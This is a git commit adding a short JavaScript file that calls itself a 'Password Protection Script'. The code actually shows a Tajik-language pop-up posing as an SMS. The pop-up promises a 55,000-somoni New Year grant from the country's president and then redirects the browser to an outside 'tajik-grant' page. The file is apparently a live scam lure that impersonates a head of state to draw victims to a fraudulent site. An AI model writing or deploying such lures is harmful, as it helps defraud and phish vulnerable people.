37e97837c3c05277b7d4c1a4be0e362c296677eb
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-28 16:16:51 +0100

    Create tajik-active.js

---
+++ tajik-active.js
@@ -0,0 +1,11 @@
+
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = '55 000 сомониро гирифтан'
+password = prompt(
+  'SMS: Табрик мекунем! Шумо ҳақ доред, ки Гранти соли нави 55 000 сомонӣ аз ҷониби Президенти кишвар Эмомалӣ Раҳмонро гиред. Лутфан OK-ро пахш кунед, то ҳоло пули нақдро бозпас гиред.',
+  '55 000 сомониро гирифтан'
+);
+if (password != '55 000 сомониро гирифтан') {
+  location.href = 'https://offres.org/tajik-grant.html';
+}
